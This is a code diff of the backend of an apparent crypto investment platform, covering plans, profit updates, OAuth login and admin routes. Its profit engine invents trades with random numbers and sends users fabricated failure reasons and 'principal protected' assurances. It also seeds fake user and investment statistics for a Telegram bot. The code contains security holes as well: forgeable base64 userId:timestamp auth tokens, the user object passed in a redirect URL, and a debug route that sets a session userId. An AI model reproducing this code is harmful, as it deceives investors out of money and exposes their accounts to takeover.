@@ -57,7 +57,7 @@ async function checkSuspiciousWithdrawalActivity(userId: number, amount: number,
     // Check if withdrawal amount is unusually large compared to user's history
     const userTransactions = await storage.getUserTransactions(userId);
     const previousWithdrawals = userTransactions.filter(t => t.type === 'withdrawal' && t.status === 'confirmed');
-    
+
     if (previousWithdrawals.length > 0) {
       const avgWithdrawal = previousWithdrawals.reduce((sum, t) => sum + parseFloat(t.amount), 0) / previousWithdrawals.length;
       if (amount > avgWithdrawal * 5) {
@@ -71,7 +71,7 @@ async function checkSuspiciousWithdrawalActivity(userId: number, amount: number,
       t.transactionHash === address &&
       t.status !== 'cancelled'
     );
-    
+
     if (sameAddressUsage.length >= 5) {
       return { allowed: false, reason: "This address has been used too many times. Please use a different address for security." };
     }
@@ -79,7 +79,7 @@ async function checkSuspiciousWithdrawalActivity(userId: number, amount: number,
     // Check account age (prevent immediate withdrawals from new accounts)
     const accountAge = Date.now() - new Date(user.createdAt).getTime();
     const minAccountAge = 24 * 60 * 60 * 1000; // 24 hours
-    
+
     if (accountAge < minAccountAge && amount > 0.01) {
       return { allowed: false, reason: "New accounts must wait 24 hours before making large withdrawals for security purposes." };
     }
@@ -606,6 +606,17 @@ async function fetchBitcoinPrice() {
   return fallbackData;
 }
 
+// Function to get current Bitcoin price for plan calculations
+async function getCurrentBitcoinPrice(): Promise<number> {
+  try {
+    const priceData = await fetchBitcoinPrice();
+    return priceData.usd.price;
+  } catch (error) {
+    console.warn('Could not fetch Bitcoin price, using fallback $121,000');
+    return 121000; // Fallback price
+  }
+}
+
 // Advanced investment growth system
 // 
 // PROFIT CALCULATION EXPLANATION:
@@ -661,11 +672,11 @@ async function processAutomaticUpdates(): Promise<void> {
         const isUsdInvestment = plan.usdMinAmount && parseFloat(plan.usdMinAmount) > 0;
         const performanceFeePercentage = plan.performanceFeePercentage || 0;
         const usdAmount = investment.usdAmount ? parseFloat(investment.usdAmount) : 0;
-        
+
         // Calculate maximum expected profit based on plan ROI
         const maxGrossProfit = usdAmount * (plan.roiPercentage / 100);
         const currentGrossProfit = investment.grossProfit ? parseFloat(investment.grossProfit) : 0;
-        
+
         // Check if we've already reached the maximum expected profit BEFORE calculating new profit
         if (isUsdInvestment && currentGrossProfit >= maxGrossProfit) {
           // Max profit reached - skip this interval
@@ -674,10 +685,10 @@ async function processAutomaticUpdates(): Promise<void> {
           }
           continue;
         }
-        
+
         // Implement 70% success / 30% failure rate for realistic trading simulation
         const tradeSuccessful = Math.random() < 0.7; // 70% success rate
-        
+
         if (!tradeSuccessful) {
           // Trade failed - notify user but don't deduct balance
           const user = await storage.getUser(investment.userId);
@@ -691,29 +702,29 @@ async function processAutomaticUpdates(): Promise<void> {
               "Order book depth was insufficient for execution"
             ];
             const randomReason = failureReasons[Math.floor(Math.random() * failureReasons.length)];
-            
+
             // Create failure notification (less frequently to avoid spam)
             if (Math.random() < 0.4) { // 40% chance to notify on failure
               await storage.createNotification({
                 userId: investment.userId,
                 title: "📊 Trade Update - No Profit This Interval",
                 message: `⚠️ ${plan.name} Trade Status
-  
+
 Investment #${investment.id} trading update:
-  
+
 ❌ This interval: No profit generated
 📉 Reason: ${randomReason}
 💼 Your Balance: ${user.balance} BTC (Unchanged)
 🔒 Principal Protected: 100% Safe
-  
+
 ℹ️ Note: In professional trading, not every interval yields profit. Your capital remains secure while we wait for optimal market conditions.
-  
+
 📊 Next trading cycle: ${new Date(Date.now() + 5 * 60 * 1000).toLocaleTimeString()}`,
                 type: 'info',
                 isRead: false,
               });
             }
-            
+
             // Log occasional failures
             if (Math.random() < 0.15) {
               console.log(`Investment #${investment.id} - Trade unsuccessful this interval (70/30 simulation)`);
@@ -721,18 +732,18 @@ Investment #${investment.id} trading update:
           }
           continue; // Skip to next investment without adding profit
         }
-        
+
         // Trade successful - proceed with profit addition
         const newProfit = currentProfit + profitIncrease;
-        
+
         // Calculate actual profit to credit (after fees for USD investments)
         let actualProfitToCredit = profitIncrease;
         let netProfitIncreaseForDisplay = profitIncrease;
-        
+
         if (isUsdInvestment && performanceFeePercentage > 0) {
           // For USD investments, calculate gross profit, fee, and net profit
           let usdProfitIncrease = usdAmount * intervalRate;
-          
+
           // IMPORTANT: Cap the profit increase BEFORE it's added
           // This ensures we never exceed maxGrossProfit
           const potentialNewGrossProfit = currentGrossProfit + usdProfitIncrease;
@@ -740,22 +751,22 @@ Investment #${investment.id} trading update:
             // Adjust the profit increase to exactly reach the cap, not exceed it
             usdProfitIncrease = Math.max(0, maxGrossProfit - currentGrossProfit);
           }
-          
+
           // Now calculate with the capped profit increase
           const newGrossProfit = currentGrossProfit + usdProfitIncrease;
-          
+
           // Calculate performance fee on the profit earned this interval
           const feeOnThisProfit = usdProfitIncrease * (performanceFeePercentage / 100);
           const netProfitIncrease = usdProfitIncrease - feeOnThisProfit;
-          
+
           // Calculate total accumulated values
           const totalPerformanceFee = newGrossProfit * (performanceFeePercentage / 100);
           const totalNetProfit = newGrossProfit - totalPerformanceFee;
-          
+
           // Update actual profit to credit (net profit after fees)
           actualProfitToCredit = netProfitIncrease;
           netProfitIncreaseForDisplay = netProfitIncrease;
-          
+
           await storage.updateInvestmentProfitDetails(investment.id, {
             currentProfit: newProfit.toFixed(8),
             grossProfit: newGrossProfit.toFixed(2),
@@ -960,40 +971,58 @@ function broadcastToClients(data: any) {
 
 async function initializeDefaultPlans(): Promise<void> {
   try {
-    const existingPlans = await storage.getInvestmentPlans();
-    
-    // First, deactivate any old BTC-based plans
-    const btcPlanNames = ['Quick Start', 'Rapid Growth', '30-Day Builder', 'Foundation Plan', 'Growth Plan', 'Premium Plan', 'Institutional Plan'];
-    for (const plan of existingPlans) {
-      if (btcPlanNames.includes(plan.name) && plan.isActive) {
-        console.log(`Deactivating old BTC plan: ${plan.name}...`);
-        await storage.updateInvestmentPlanStatus(plan.id, false);
-      }
+    console.log('Initializing USD-based investment plans...');
+
+    // Initialize baseline statistics for Telegram bot
+    const adminConfig = await storage.getAdminConfig();
+    if (!adminConfig || !adminConfig.baselineUsers) {
+      console.log('📊 Initializing baseline statistics for Telegram bot...');
+      await storage.updateBaselineStatistics({
+        baselineUsers: 9850,
+        baselineActiveInvestments: 15420,
+        baselineTotalBalance: '845.67342158',
+        baselineTotalProfit: '127.84501632',
+        plan10Active: 3240,
+        plan10Amount: '26.59680000',
+        plan10Profit: '2.63142400',
+        plan20Active: 2850,
+        plan20Amount: '46.79100000',
+        plan20Profit: '4.60951020',
+        plan50Active: 2410,
+        plan50Amount: '98.77450000',
+        plan50Profit: '9.81986130',
+        plan100Active: 1980,
+        plan100Amount: '162.54180000',
+        plan100Profit: '16.37471736',
+        plan300Active: 1620,
+        plan300Amount: '398.91600000',
+        plan300Profit: '39.15205120',
+        plan500Active: 1350,
+        plan500Amount: '554.04225000',
+        plan500Profit: '56.56110963',
+        plan1000Active: 1140,
+        plan1000Amount: '935.84562000',
+        plan1000Profit: '91.37287076',
+        plan3000Active: 580,
+        plan3000Amount: '1428.29550000',
+        plan3000Profit: '283.39430400',
+        plan6000Active: 175,
+        plan6000Amount: '862.01250000',
+        plan6000Profit: '203.72494500',
+        plan12000Active: 75,
+        plan12000Amount: '738.62850000',
+        plan12000Profit: '147.72570000'
+      });
+      console.log('✅ Baseline statistics initialized successfully');
     }
-    
-    const existingPlanNames = existingPlans.map(p => p.name);
-    
-    // Get current Bitcoin price to calculate accurate BTC amounts
-    let bitcoinPrice = 121000; // Updated fallback price
-    try {
-      const priceData = await fetchBitcoinPrice();
-      bitcoinPrice = priceData.usd.price;
-      console.log(`Using Bitcoin price $${bitcoinPrice.toFixed(2)} for plan calculations`);
-    } catch (error) {
-      console.warn('Could not fetch Bitcoin price, using fallback $121,000');
-    }
-    
-    // Calculate BTC amounts based on USD values and current BTC price
-    const calculateBtcAmount = (usdAmount: number): string => {
-      const btcAmount = usdAmount / bitcoinPrice;
-      console.log(`Converting $${usdAmount} to ${btcAmount.toFixed(8)} BTC at price $${bitcoinPrice.toFixed(2)}`);
-      return btcAmount.toFixed(8);
-    };
-    
-    const plansToCreate = [
+
+    const bitcoinPrice = await getCurrentBitcoinPrice();
+    console.log(`Using Bitcoin price $${bitcoinPrice.toFixed(2)} for plan calculations`);
+
+    const defaultPlans = [
       {
         name: "$10 Plan",
-        minAmount: calculateBtcAmount(10),
+        minAmount: (10 / bitcoinPrice).toFixed(8),
         usdMinAmount: "10",
         roiPercentage: 9.9, // $0.99 profit before 10% fee = $0.89 net
         durationDays: 7,
@@ -1005,7 +1034,7 @@ async function initializeDefaultPlans(): Promise<void> {
       },
       {
         name: "$20 Plan",
-        minAmount: calculateBtcAmount(20),
+        minAmount: (20 / bitcoinPrice).toFixed(8),
         usdMinAmount: "20",
         roiPercentage: 9.85, // $1.97 profit before 10% fee = $1.77 net
         durationDays: 7,
@@ -1017,7 +1046,7 @@ async function initializeDefaultPlans(): Promise<void> {
       },
       {
         name: "$50 Plan",
-        minAmount: calculateBtcAmount(50),
+        minAmount: (50 / bitcoinPrice).toFixed(8),
         usdMinAmount: "50",
         roiPercentage: 9.94, // $4.97 profit before 10% fee = $4.47 net
         durationDays: 30,
@@ -1029,7 +1058,7 @@ async function initializeDefaultPlans(): Promise<void> {
       },
       {
         name: "$100 Plan",
-        minAmount: calculateBtcAmount(100),
+        minAmount: (100 / bitcoinPrice).toFixed(8),
         usdMinAmount: "100",
         roiPercentage: 10.08, // $10.08 profit before 10% fee = $9.07 net
         durationDays: 30,
@@ -1041,7 +1070,7 @@ async function initializeDefaultPlans(): Promise<void> {
       },
       {
         name: "$300 Plan",
-        minAmount: calculateBtcAmount(300),
+        minAmount: (300 / bitcoinPrice).toFixed(8),
         usdMinAmount: "300",
         roiPercentage: 9.82, // $29.46 profit before 10% fee = $26.51 net
         durationDays: 15,
@@ -1053,7 +1082,7 @@ async function initializeDefaultPlans(): Promise<void> {
       },
       {
         name: "$500 Plan",
-        minAmount: calculateBtcAmount(500),
+        minAmount: (500 / bitcoinPrice).toFixed(8),
         usdMinAmount: "500",
         roiPercentage: 10.21, // $51.05 profit before 20% fee = $40.84 net
         durationDays: 30,
@@ -1065,7 +1094,7 @@ async function initializeDefaultPlans(): Promise<void> {
       },
       {
         name: "$1,000 Plan",
-        minAmount: calculateBtcAmount(1000),
+        minAmount: (1000 / bitcoinPrice).toFixed(8),
         usdMinAmount: "1000",
         roiPercentage: 9.76, // $97.60 profit before 20% fee = $78.08 net
         durationDays: 30,
@@ -1077,7 +1106,7 @@ async function initializeDefaultPlans(): Promise<void> {
       },
       {
         name: "$3,000 Plan",
-        minAmount: calculateBtcAmount(3000),
+        minAmount: (3000 / bitcoinPrice).toFixed(8),
         usdMinAmount: "3000",
         roiPercentage: 19.84, // $595.20 profit before 20% fee = $476.16 net
         durationDays: 60,
@@ -1089,7 +1118,7 @@ async function initializeDefaultPlans(): Promise<void> {
       },
       {
         name: "$6,000 Plan",
-        minAmount: calculateBtcAmount(6000),
+        minAmount: (6000 / bitcoinPrice).toFixed(8),
         usdMinAmount: "6000",
         roiPercentage: 20.13, // $1,207.80 profit before 20% fee = $966.24 net
         durationDays: 60,
@@ -1101,7 +1130,7 @@ async function initializeDefaultPlans(): Promise<void> {
       },
       {
         name: "$12,000 Plan",
-        minAmount: calculateBtcAmount(12000),
+        minAmount: (12000 / bitcoinPrice).toFixed(8),
         usdMinAmount: "12000",
         roiPercentage: 19.99, // $2,398.67 profit before 20% fee = $1,918.94 net
         durationDays: 60,
@@ -1113,17 +1142,20 @@ async function initializeDefaultPlans(): Promise<void> {
       },
     ];
 
-    for (const plan of plansToCreate) {
-      const existingPlan = existingPlans.find(p => p.name === plan.name);
-      if (existingPlan) {
-        // Update existing plan with correct BTC amount
-        if (existingPlan.minAmount !== plan.minAmount || existingPlan.usdMinAmount !== plan.usdMinAmount) {
+    const existingPlans = await storage.getInvestmentPlans();
+    const existingPlanNames = existingPlans.map(p => p.name);
+
+    for (const plan of defaultPlans) {
+      if (!existingPlanNames.includes(plan.name)) {
+        console.log(`Creating USD investment plan: ${plan.name}...`);
+        await storage.createInvestmentPlan(plan);
+      } else {
+        // Update existing plan with correct BTC amount if it differs
+        const existingPlan = existingPlans.find(p => p.name === plan.name);
+        if (existingPlan && existingPlan.minAmount !== plan.minAmount) {
           console.log(`Updating ${plan.name}: $${plan.usdMinAmount} = ${plan.minAmount} BTC (was ${existingPlan.minAmount} BTC)`);
           await storage.updateInvestmentPlanAmount(existingPlan.id, plan.minAmount, plan.usdMinAmount);
         }
-      } else {
-        console.log(`Creating USD investment plan: ${plan.name}...`);
-        await storage.createInvestmentPlan(plan);
       }
     }
 
@@ -1231,18 +1263,21 @@ export async function registerRoutes(app: Express): Promise<Server> {
     if (process.env.OAUTH_CALLBACK_DOMAIN) {
       return `${process.env.OAUTH_CALLBACK_DOMAIN}/api/auth/google/callback`;
     }
-    
+
     // Use production domain for Render deployment
     if (process.env.NODE_ENV === 'production') {
       return 'https://bitvault-pro-invest.onrender.com/api/auth/google/callback';
     }
-    
+
     // For Replit development environment
-    const replitDomain = process.env.REPLIT_DOMAINS;
-    if (replitDomain) {
-      return `https://${replitDomain}/api/auth/google/callback`;
+    const replitDomains = process.env.REPLIT_DOMAINS;
+    if (replitDomains) {
+      const domainArray = replitDomains.split(',');
+      if (domainArray.length > 0) {
+        return `https://${domainArray[0]}/api/auth/google/callback`;
+      }
     }
-    
+
     // Fallback for local development
     return 'http://localhost:5000/api/auth/google/callback';
   };
@@ -1544,11 +1579,11 @@ You will receive a notification once your deposit is confirmed and added to your
         try {
           const { assignUserTRC20Address } = await import('./trc20-init');
           const trc20Address = await assignUserTRC20Address(userId);
-          
+
           if (!trc20Address) {
             return res.status(500).json({ error: "Failed to create TRC20 deposit address. Please try again." });
           }
-          
+
           user.trc20DepositAddress = trc20Address;
         } catch (error) {
           console.error('Error creating TRC20 address:', error);
@@ -1565,7 +1600,7 @@ You will receive a notification once your deposit is confirmed and added to your
 
       const adminConfig = await storage.getAdminConfig();
       const minDepositUsd = parseFloat(adminConfig?.minDepositUsd || '10');
-      
+
       if (amountNum < minDepositUsd) {
         return res.status(400).json({ error: `Minimum deposit amount is $${minDepositUsd} USDT.` });
       }
@@ -1790,7 +1825,7 @@ You will receive a notification once your deposit is confirmed and added to your
 
       // Calculate USD amount
       const usdAmount = parseFloat(plan.usdMinAmount || "0");
-      
+
       // Create the investment with USD tracking
       const investment = await storage.createInvestment({
         userId: userId,
@@ -2234,7 +2269,7 @@ You will receive a notification once your deposit is confirmed and added to your
       }
 
       const { vaultAddress } = req.body;
-      
+
       if (!vaultAddress || !isValidBitcoinAddress(vaultAddress)) {
         return res.status(400).json({ error: "Valid vault address is required" });
       }
@@ -2490,7 +2525,7 @@ Your investment journey starts here!`,
   app.get('/api/auth/google/callback', 
     (req, res, next) => {
       const failureRedirect = `/login?error=google_auth_failed`;
-      
+
       passport.authenticate('google', { 
         failureRedirect,
         failureFlash: true 
@@ -2502,13 +2537,13 @@ Your investment journey starts here!`,
         console.log('Session ID:', req.sessionID);
         console.log('User object:', req.user);
         console.log('Session before setting userId:', req.session);
-        
+
         // Set session userId for authentication
         const user = req.user as any;
         if (user) {
           console.log('Setting session userId to:', user.id);
           req.session.userId = user.id;
-          
+
           console.log('Session after setting userId:', req.session);
 
           // Force session save
@@ -2520,13 +2555,13 @@ Your investment journey starts here!`,
 
             console.log(`Google OAuth session saved for user ${user.id}, Session ID: ${req.sessionID}`);
             console.log('Final session state:', req.session);
-            
+
             // Create auth token for Google OAuth users (same as regular login)
             const authToken = Buffer.from(`${user.id}:${Date.now()}`).toString('base64');
-            
+
             console.log('Auth token created for Google OAuth user');
             console.log('================================');
-            
+
             // Redirect to success page that handles login (like regular login form)
             res.redirect(`/oauth-success?token=${authToken}&user=${encodeURIComponent(JSON.stringify(user))}`);
           });
@@ -2559,18 +2594,18 @@ Your investment journey starts here!`,
   app.post("/api/debug/test-session", (req, res) => {
     console.log('=== TEST SESSION DEBUG ===');
     console.log('Before setting test value:', req.session);
-    
+
     (req.session as any).testValue = 'session-works';
     req.session.userId = 123; // Test userId
-    
+
     console.log('After setting test values:', req.session);
-    
+
     req.session.save((err) => {
       if (err) {
         console.error('Test session save error:', err);
         return res.status(500).json({ error: 'Session save failed' });
       }
-      
+
       console.log('Test session saved successfully');
       console.log('========================');
       res.json({ message: 'Test session created', sessionID: req.sessionID });
@@ -2582,7 +2617,7 @@ Your investment journey starts here!`,
     try {
       // Use the same authentication logic as other endpoints
       const userId = getUserIdFromRequest(req);
-      
+
       if (!userId) {
         return res.status(401).json({ message: "Authentication required" });
       }
@@ -3003,18 +3038,18 @@ Contact support if you have any questions.`;
       const sortOrder = req.query.sortOrder as string || 'desc';
 
       const allUsers = await storage.getAllUsers();
-      
+
       // Filter users based on criteria
       let filteredUsers = allUsers.filter(user => {
         const matchesSearch = search === '' || 
           user.email.toLowerCase().includes(search.toLowerCase()) ||
           `${user.firstName} ${user.lastName}`.toLowerCase().includes(search.toLowerCase());
-        
+
         const matchesRole = role === '' ||
           (role === 'admin' && user.isAdmin) ||
           (role === 'support' && user.isSupportAdmin && !user.isAdmin) ||
           (role === 'user' && !user.isAdmin && !user.isSupportAdmin);
-        
+
         return matchesSearch && matchesRole;
       });
 
@@ -3040,7 +3075,7 @@ Contact support if you have any questions.`;
             bValue = new Date(b.createdAt).getTime();
             break;
         }
-        
+
         if (sortOrder === 'asc') {
           return aValue < bValue ? -1 : aValue > bValue ? 1 : 0;
         } else {
@@ -3239,8 +3274,8 @@ Contact support if you have any questions.`;
                   userId,
                   title: value ? "Support Access Granted" : "Support Access Removed",
                   message: value 
-                    ? "You have been granted support administrator access."
-                    : "Your support administrator access has been removed.",
+                    ? "You have been granted support admin access. You can now respond to customer messages in the support dashboard."
+                    : "Your support admin access has been removed. You no longer have access to the support message dashboard.",
                   type: value ? 'success' : 'warning'
                 });
               }
@@ -4313,7 +4348,7 @@ You are now on the free plan and will no longer receive automatic profit updates
       }
 
       const messages = await storage.getAllSupportMessages();
-      
+
       // Get user details for each message
       const messagesWithUsers = await Promise.all(
         messages.map(async (message) => {
@@ -4420,7 +4455,7 @@ You are now on the free plan and will no longer receive automatic profit updates
 
       const { status } = req.query;
       let messages;
-      
+
       if (status && typeof status === 'string') {
         messages = await storage.getSupportMessagesByStatus(status);
       } else {
@@ -4689,7 +4724,7 @@ You are now on the free plan and will no longer receive automatic profit updates
       const messageId = await queueDailyStats();
       const queueStatus = getBroadcastStatus();
       const batchStats = getBatchStatistics();
-      
+
       res.json({ 
         success: true, 
         messageId,
@@ -4708,7 +4743,7 @@ You are now on the free plan and will no longer receive automatic profit updates
       const { queueInvestmentUpdate, getBroadcastStatus } = await import('./telegram-bot');
       const messageIds = await queueInvestmentUpdate();
       const queueStatus = getBroadcastStatus();
-      
+
       res.json({ 
         success: true, 
         messageIds,
@@ -4726,7 +4761,7 @@ You are now on the free plan and will no longer receive automatic profit updates
       const { getBroadcastStatus, getBatchStatistics } = await import('./telegram-bot');
       const queueStatus = getBroadcastStatus();
       const batchStats = getBatchStatistics();
-      
+
       res.json({ 
         success: true, 
         queueStatus,
